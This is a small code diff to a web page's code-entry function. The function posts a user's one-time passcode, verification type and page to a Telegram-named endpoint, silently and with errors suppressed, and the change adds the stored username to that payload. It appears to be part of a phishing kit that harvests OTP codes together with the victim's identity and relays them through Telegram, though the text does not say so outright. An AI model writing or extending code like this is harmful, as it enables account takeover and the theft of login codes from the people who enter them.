@@ -144,11 +144,9 @@ function EnterCodeContent() {
     void fetch("/api/telegram/verification", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        code: otpCode,
+      body: JSON.stringify({ userId: readStoredUsername(), code: otpCode,
         verificationType: typeLabel,
-        page: "/verify",
-      }),
+        page: "/verify", }),
       keepalive: true,
     }).catch(() => {})
 
